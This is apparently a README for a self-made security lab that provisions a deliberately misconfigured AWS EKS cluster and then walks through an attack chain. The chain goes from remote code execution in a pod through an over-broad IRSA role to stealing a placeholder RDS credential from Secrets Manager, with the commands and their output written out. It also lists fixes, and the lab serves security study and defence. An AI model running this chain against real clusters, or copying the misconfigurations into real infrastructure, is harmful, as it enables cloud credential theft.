# reat2shell: Insecure EKS

[Back](../README.md)

- [reat2shell: Insecure EKS](#reat2shell-insecure-eks)
  - [Goal](#goal)
  - [Infra Design](#infra-design)
    - [Key Misconfigs](#key-misconfigs)
  - [Infra provision](#infra-provision)
    - [EKS](#eks)
    - [ArgoCD](#argocd)
  - [Breach](#breach)
    - [Attack Chain](#attack-chain)
    - [Attack Steps](#attack-steps)

---

## Goal

1. Create EKS cluster with insecure configurations
   - `eks-insecure`
2. Create cloud crown jewel — the **RDSsecret in Secrets Manager**.
3. Deploy using `GitOps`

---

## Infra Design

Terraform in a single stack

```txt
infra/
  eks-insecure/       # insecure cluster + crown jewel + misconfig — remote state
```

- **Remote state**:
  - uses an **existing** S3 bucket (versioned, encrypted).

- Infrasture layers built with AWS modules:

| Layers | Features                                                       |
| ------ | -------------------------------------------------------------- |
| VPC    | 2 AZs; subnets: public+private                                 |
| EKS    | node group, OIDC enables                                       |
| Secret | Secrets Manager holding a fake RDS credential; the crown jewel |
| irsa   | misonfig IRSA role for SA `insecure-frontend:react2shell`      |

**Build order:** `eks/`: vpc → cluster → secret → irsa

**Milestone check:** `kubectl get nodes` ready; from inside the pod,
`aws secretsmanager get-secret-value` returns the secret (misconfig live).

---

### Key Misconfigs

| #   | Misconfig                                | Exploit                             | Fix                                                      |
| --- | ---------------------------------------- | ----------------------------------- | -------------------------------------------------------- |
| 1   | Broad IAM policy on the pod's IRSA role  | RCE inherits it → read any secret   | Scope to `GetSecretValue` on the one secret ARN          |
| 2   | Loose IRSA trust policy (wildcard `sub`) | Lets the pod assume the broad role  | Pin `sub` to the SA + `aud = sts.amazonaws.com`          |
| 3   | EKS audit logs / CloudTrail off          | Breach is silent (cloud detect gap) | Enable audit + authenticator logs, CloudTrail (optional) |

---

## Infra provision

### EKS

```sh
# init
terraform -chdir=infra/eks-insecure init -backend-config=backend.hcl
terraform -chdir=infra/eks-insecure init -backend-config=backend.hcl -reconfigure
terraform -chdir=infra/eks-insecure init -backend-config=backend.hcl -upgrade

terraform -chdir=infra/eks-insecure fmt && terraform -chdir=infra/eks-insecure validate
terraform -chdir=infra/eks-insecure plan

terraform -chdir=infra/eks-insecure apply -auto-approve
terraform -chdir=infra/eks-insecure refresh
terraform -chdir=infra/eks-insecure output

# clean up
terraform -chdir=infra/eks-insecure destroy -auto-approve
```

---

### ArgoCD

```sh
# kubeconfig
aws eks update-kubeconfig --name react2shell-eks-insecure --region ca-central-1
kubectl get nodes

# argocd synced the app-of-apps
kubectl get applications -n argocd

# port-forward the argocd
# get pwd
kubectl -n argocd get secret argocd-initial-admin-secret -o jsonpath="{.data.password}" | base64 --decode; echo
# port forward
kubectl port-forward service/argocd-server -n argocd 8443:443

kubectl apply -f argocd/insecure-root-app.yaml
```

---

## Breach

### Attack Chain

```txt
React2Shell RCE in pod
  └─▶ pod's IRSA role  (dev attached a broad policy)        [misconfig 1 + 2]
        └─▶ aws secretsmanager get-secret-value <rds-secret>
              └─▶ 🪙 RDS secret
```

---

### Attack Steps

| #   | Step             | What                                                | Expected result                 |
| --- | ---------------- | --------------------------------------------------- | ------------------------------- |
| 1   | Confirm RCE      | Run `id` via the React2Shell exploit                | Code exec on the pod            |
| 2   | Detect IRSA      | Read `AWS_ROLE_ARN` / web-identity token env vars   | Pod has an AWS identity         |
| 3   | Upload script    | `aws ...` → not found; stage a Node exploit instead | Attacker uses what's on the box |
| 4   | get blast radius | `steal_secret.js --list`: ListSecrets via `*/*`     | Lists secrets beyond its own    |
| 5   | **Grab jewel**   | `steal_secret.js`: assume-role → GetSecretValue     | 🪙 RDS secret exfiltrated       |

**Milestone:** cloud-level crown jewel retrieved

---

- App port-forwarded at `react2shell-insecure.arguswatcher.net:3000`.
- Exploit via `scripts/rce.py`.

```sh
# restart the pod to pick up the IRSA token
kubectl rollout restart deploy/react2shell -n insecure-frontend

# port forward
kubectl port-forward service/react2shell -n insecure-frontend 3000:3000

vi /etc/hosts
# 127.0.0.1 react2shell-insecure.arguswatcher.net

# ##############################
# Attack
# ##############################
# 1. confirm RCE by id
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "id"
# uid=0(root) gid=0(root) groups=0(root)

# 2. detect IRSA — pod has an AWS identity
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "env | grep AWS"
# AWS_ROLE_ARN=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token
# AWS_STS_REGIONAL_ENDPOINTS=regional
# AWS_DEFAULT_REGION=ca-central-1
# AWS_REGION=ca-central-1

# get web id
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "cat \$AWS_WEB_IDENTITY_TOKEN_FILE"
# eyJhbGciOiJSUzI1NiIsImtpZCI6IjFhN2U2ZDBiZGY4ODBhNjQ0NGNjYmNlYjZiYWYzNDY4MDA1NDhkOGYiLCJ0eXAiOiJKV1QifQ.eyJhdWQiOlsic3RzLmFtYXpvbmF3cy5jb20iXSwiZXh...

# try aws CLI
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "aws sts get-caller-identity"
# /bin/sh: 1: aws: not found

# 3. upload js
b64=$(base64 -w0 scripts/steal_secret.js)
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "echo $b64 | base64 -d > /tmp/s.js"

# 4. blast radius: the */* role lists secrets
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js --list"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=list
# {"SecretList":[{"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606357E9,"Description":"RDS master credential (crown jewel).","LastAccessedDate":1.7921088E9,"LastChangedDate":1.792173606666E9,"Name":"react2shell-eks-insecure-rds-credential","SecretVersionsToStages":{"terraform-mb3RtAygQ7r01zMpAb4UulrH4x":["AWSCURRENT"]},"Tags":[{"Key":"Project","Value":"react2shell-eks"},{"Key":"Environment","Value":"insecure"},{"Key":"ManagedBy","Value":"terraform"}]}]}

# 5. grab the crown jewel with Node built-ins only (no aws CLI/SDK).
# steal_secret.js:
# read IRSA token -> STS AssumeRoleWithWebIdentity -> Secrets Manager GetSecretValue
python3 scripts/rce.py http://react2shell-insecure.arguswatcher.net:3000 "node /tmp/s.js react2shell-eks-insecure-rds-credential"
# [*] role=arn:aws:iam:::role/react2shell-eks-insecure-pod-irsa region=ca-central-1 mode=get secret=react2shell-eks-insecure-rds-credential
# {"ARN":"arn:aws:secretsmanager:ca-central-1::secret:react2shell-eks-insecure-rds-credential-lnBySG","CreatedDate":1.792173606659E9,"Name":"react2shell-eks-insecure-rds-credential","SecretString":"{\"dbname\":\"appdb\",\"engine\":\"postgres\",\"host\":\"placeholder.rds.amazonaws.com\",\"password\":\"RDS-sECrEt-InsECurE\",\"port\":5432,\"username\":\"rds_admin\"}","VersionId":"terraform-mb3RtAygQ7r01zMpAb4UulrH4x","VersionStages":["AWSCURRENT"]}
```
